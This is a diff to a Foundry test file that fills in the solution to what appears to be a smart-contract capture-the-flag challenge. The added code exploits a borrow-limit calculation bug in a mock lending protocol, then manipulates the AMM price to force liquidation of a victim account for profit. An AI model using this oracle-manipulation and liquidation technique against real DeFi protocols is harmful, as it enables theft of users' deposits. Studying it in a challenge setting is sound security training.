@@ -64,8 +64,7 @@ contract Challenge8Test is Test {
         vm.stopPrank();
     }
 
-
-    function testSolution()public {
+    function testSolution() public {
         // Victim set up
         vm.startPrank(superman);
         token.approve(address(oiler), 100);
@@ -74,7 +73,6 @@ contract Challenge8Test is Test {
         oiler.borrow(75);
         oiler.healthFactor(superman);
         vm.stopPrank();
-
 
         // Player initial balance is of 100 $TOKEN and 100 $DAI
         console.log("Initial token balance: ", token.balanceOf(player));
@@ -86,8 +84,18 @@ contract Challenge8Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
+        // borrow sufficient debt token to liquidate superman (3.75 that for / property become 3 dTOKEN)
+        token.approve(address(oiler), type(uint256).max);
+        oiler.deposit(1); // there is a bug in maxBorrow amount calculation
+        oiler.borrow(3);
+        // sell token to decrease superman health factor
+        token.approve(address(amm), type(uint256).max);
+        amm.swap(address(token), 99);
+        // liquidate superman
+        oiler.liquidate(superman);
+        // buy token
+        dai.approve(address(amm), type(uint256).max);
+        amm.swap(address(dai), dai.balanceOf(player));
 
         //==================================================//
         vm.stopPrank();
@@ -99,7 +107,5 @@ contract Challenge8Test is Test {
         Oiler.User memory victim = oiler.getUserData(superman);
         assertEq(victim.liquidated, true);
         assert(token.balanceOf(player) > 200);
-
     }
-
 }
